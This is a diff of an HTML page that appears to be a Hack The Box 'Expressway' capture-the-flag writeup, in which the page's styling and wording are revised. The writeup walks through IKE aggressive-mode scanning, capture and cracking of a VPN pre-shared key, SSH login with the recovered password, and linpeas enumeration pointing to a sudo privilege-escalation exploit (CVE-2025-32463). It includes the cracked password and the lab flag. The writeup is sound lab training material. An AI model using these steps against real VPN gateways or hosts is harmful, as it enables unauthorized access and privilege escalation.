@@ -3,381 +3,91 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Expressway Writeup — Hackthekat</title>
   <meta name="description" content="HTB Expressway machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      expressway
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>expressway</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
       <h1>Hack The Box: <span class="accent">Expressway</span></h1>
       <div class="writeup-badges">
         <span class="htb-badge os-linux">Linux</span>
-        <span class="htb-badge diff-medium">Easy</span>
+        <span class="htb-badge diff-medium">Medium</span>
       </div>
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Expressway</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-easy">Easy</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-linux">Linux</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Expressway is a Medium difficulty Linux machine that exposes an <strong>IPsec/IKE VPN</strong> service on UDP port 500. The attack path involves fingerprinting the IKE implementation, capturing and cracking the pre-shared key (PSK), and using the recovered credentials for SSH access. Privilege escalation is achieved through <strong>CVE-2025-32463</strong>, a local privilege escalation vulnerability.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+      <p>I start with a full port scan to identify all open ports.</p>
       <div class="code-block"><pre><code>TCP
 ┌──(kali㉿kali)-[~/HTB/Expressway]
 └─$ nmap -p- -sCV 10.129.219.197
@@ -385,8 +95,8 @@ Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 10:49 CEST
 Nmap scan report for 10.129.219.197
 Host is up (0.021s latency).
 Not shown: 65534 closed tcp ports (reset)
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 10.0p2 Debian 8 (protocol 2.0)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 UDP
@@ -395,55 +105,53 @@ UDP
 Host is up, received echo-reply ttl 63 (0.15s latency).
 Scanned at 2025-09-22 11:03:34 CEST for 1042s
 Not shown: 955 closed udp ports (port-unreach)
-PORT STATE SERVICE REASON
-500/udp open isakmp udp-response ttl 63</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the host.</p>
+PORT      STATE         SERVICE     REASON
+500/udp   open          isakmp      udp-response ttl 63</code></pre></div>
+      <p>A detailed service scan provides more information about the running services.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Expressway]
 └─$ nmap -p500 -sU --script ike-version 10.129.219.197
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 11:38 CEST
 Nmap scan report for 10.129.219.197
 Host is up (0.024s latency).
 
-PORT STATE SERVICE
-500/udp open isakmp
+PORT    STATE SERVICE
+500/udp open  isakmp
 | ike-version: 
-| attributes: 
-| XAUTH
-|_ Dead Peer Detection v1.0
+|   attributes: 
+|     XAUTH
+|_    Dead Peer Detection v1.0
 
 Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</code></pre></div>
-      <h4 class="writeup-step-title">IPsec/IKE VPN - Port 500/UDP</h4>
-      <p>It is good to know that there are several steps. I will start with the basic information.
-IPsec is widely recognized as the principal technology for securing communications between networks (LAN-to-LAN) and from remote users to the network gateway (remote access), serving as the backbone for enterprise VPN solutions. The establishment of a security association (SA) between two points is managed by IKE, which operates under the umbrella of ISAKMP, a protocol designed for the authentication and key exchange.
-This process unfolds in several phases:</p>
-      <p>Phase1: Secure channel established between the two endpoints. The identity will then be verified using the username and password.</p>
-      <p>Phase2: This phase is used to set up the parameters for securing the data with the ESP (Encapsulating Security Payload) and the AH (Authentication Header). It allows for the use of algorithms different from those in Phase 1 to ensure Perfect Forward Secrecy (PFS)</p>
-      <p>But the detailed portscan took to long so i started directly by checking the port with the ike-scan tool. There you can see that there is a know email address and 1 returned handshake.</p>
+      <h2 class="writeup-section-title">Foothold: IPsec/IKE VPN Exploitation</h2>
+      <h3 class="writeup-sub-title">Understanding IPsec</h3>
+      <p><strong>IPsec</strong> (Internet Protocol Security) is a protocol suite for securing IP communications through authentication and encryption. It operates in two phases: <strong>Phase 1</strong> establishes a secure channel and verifies identity using credentials (username/password or certificates), while <strong>Phase 2</strong> configures the parameters for securing data using ESP (Encapsulating Security Payload).</p>
+      <h3 class="writeup-sub-title">IKE Fingerprinting</h3>
+      <p>Since the detailed port scan was taking too long, I directly probed port 500 using the <code>ike-scan</code> tool. This tool sends IKE Phase 1 proposals to discover the VPN gateway's supported transforms and authentication methods.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Expressway]
 └─$ ike-scan -M -A 10.129.219.197
 Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
-10.129.219.197 Aggressive Mode Handshake returned
- HDR=(CKY-R=b486de9a46ce9284)
- SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
- KeyExchange(128 bytes)
- Nonce(32 bytes)
- ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
- VID=09002689dfd6b712 (XAUTH)
- VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
- Hash(20 bytes)
+10.129.219.197  Aggressive Mode Handshake returned
+        HDR=(CKY-R=b486de9a46ce9284)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
 
-Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (40.12 hosts/sec). 1 returned handshake; 0 returned notify</code></pre></div>
-      <p>Now that I have started passive fingerprinting as described above, I have obtained the pre-shared key hash using the command below. Please note that this is only possible if aggressive mode is enabled. If aggressive mode is enabled, this is a security risk because it allows an attacker to retrieve VPN group names and crack credentials offline.</p>
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (40.12 hosts/sec).  1 returned handshake; 0 returned notify</code></pre></div>
+      <h3 class="writeup-sub-title">Pre-Shared Key Extraction</h3>
+      <p>Through aggressive-mode fingerprinting, I was able to capture the <strong>pre-shared key hash</strong>. In IKE aggressive mode, the responder sends its identity and hash in the first exchange — making it vulnerable to offline cracking.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Expressway]
 └─$ ike-scan -A --pskcrack 10.129.219.197
 Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
-10.129.219.197 Aggressive Mode Handshake returned HDR=(CKY-R=34f5dff6c738e4ab) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+10.129.219.197  Aggressive Mode Handshake returned HDR=(CKY-R=34f5dff6c738e4ab) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
 
 IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
 c2b2c37e72ce8b21a0d5132c2b9dcdeda4c9f5dea4721829193010625b1a83dc1ce58e83d2a78a1e0417a839981d873fe3066be2a3a266f60fd59b2cca460f392a07adcf486f9e7a861eba6450af5b8982c52df1d8739a8a056135657471def9e580dd17a9766475929a1312ea4525f2e2eb6a69afd8d9074c20b952171e63f4:b8dad530a8a716f4eb2bfddd723f7f7d5888fb6e8e9dfe2a652c0e4aa0b00c584d4851790c1e93407576dd3031b227b4d67936039452af96791928c1f5d8b96544a71fc6dc88c7973a75e64f049dc9989859e3db3df5f45f4384a562674c6727cdae92b81073b0449a5fd05827d824ae34a7a8816d830316ad6910c47c28f4d0:34f5dff6c738e4ab:4e197efd9cb7c9c1:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:cf96cc2e86c47802ca867aaee13c6964e21d9c89:55c7706d40ab12697bfb5bfea5058fe2236cd454c2f1de3c447857c6976772bf:786857175446e06698e941b7334f7282a573506f
-Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (39.33 hosts/sec). 1 returned handshake; 0 returned notify</code></pre></div>
-      <p>I will put the hash in a file and try to crack it using pskcrack.</p>
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (39.33 hosts/sec).  1 returned handshake; 0 returned notify</code></pre></div>
+      <p>I save the hash to a file and crack it using <code>pskcrack</code>, a specialized tool for breaking IKE pre-shared keys.</p>
       <div class="code-block"><pre><code>Hash in een file zetten
 ┌──(kali㉿kali)-[~/HTB/Expressway]
 └─$ echo &#x27;c2b2c37e72ce8b21a0d5132c2b9dcdeda4c9f5dea4721829193010625b1a83dc1ce58e83d2a78a1e0417a839981d873fe3066be2a3a266f60fd59b2cca460f392a07adcf486f9e7a861eba6450af5b8982c52df1d8739a8a056135657471def9e580dd17a9766475929a1312ea4525f2e2eb6a69afd8d9074c20b952171e63f4:b8dad530a8a716f4eb2bfddd723f7f7d5888fb6e8e9dfe2a652c0e4aa0b00c584d4851790c1e93407576dd3031b227b4d67936039452af96791928c1f5d8b96544a71fc6dc88c7973a75e64f049dc9989859e3db3df5f45f4384a562674c6727cdae92b81073b0449a5fd05827d824ae34a7a8816d830316ad6910c47c28f4d0:34f5dff6c738e4ab:4e197efd9cb7c9c1:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:cf96cc2e86c47802ca867aaee13c6964e21d9c89:55c7706d40ab12697bfb5bfea5058fe2236cd454c2f1de3c447857c6976772bf:786857175446e06698e941b7334f7282a573506f&#x27; &gt; hash
@@ -455,49 +163,43 @@ Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
 Running in dictionary cracking mode
 key &quot;freakingrockstarontheroad&quot; matches SHA1 hash 786857175446e06698e941b7334f7282a573506f
 Ending psk-crack: 8045040 iterations in 7.366 seconds (1092233.91 iterations/sec)</code></pre></div>
-      <p>Now that we know the username and password, we can log in to the SSH server. To do this, use the credentials below.</p>
+      <h3 class="writeup-sub-title">SSH Access</h3>
+      <p>With the recovered username and password from the PSK cracking, I authenticate over SSH and obtain a shell.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Expressway]
-└─$ ssh ike@10.129.219.197 
+└─$ ssh ike@10.129.219.197                     
 Last login: Mon Sep 22 10:53:34 2025 from 10.10.16.19
 ike@expressway:~$</code></pre></div>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">364d1650268c1786f8d43cf1e42df4ad</code>
-</div>
+      <p>I read the user flag from the current user's home directory.</p>
       <div class="code-block"><pre><code>ike@expressway:~$ cat user.txt 
 364d1650268c1786f8d43cf1e42df4ad</code></pre></div>
-      <h4 class="writeup-step-title">Priv Escalation</h4>
-      <p>I first checked whether I could use the sudo -l command to see if I could execute anything without admin rights. But as you can see for yourself, this is not possible. So I downloaded Linpeas so that I could find any gaps in the system. Using Linpeas, I took a look and saw that sudo could be used for priv escalation.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">364d1650268c1786f8d43cf1e42df4ad</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: CVE-2025-32463</h2>
+      <p>I check for sudo misconfigurations with <code>sudo -l</code>, but nothing useful is found. I then upload and run <strong>linpeas</strong> for broader system enumeration.</p>
       <div class="code-block"><pre><code>ike@expressway:~$ ./linpeas_linux_amd64 
 
 ╔══════════╣ Sudo version
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version 
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                     
 Sudo version 1.9.17 
 
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid 
-strace Not Found 
--rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4 
--rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo ---&gt; check_if_the_sudo_version_is_vulnerable</code></pre></div>
-      <p>So I started looking for an exploit and came across the following URL. https://github.com/kh4sh3i/CVE-2025-32463</p>
-      <p>I downloaded the file again to the SSH connection, converted the permissions to execute permissions for the exploit.sh file, executed this file, and we were root users.</p>
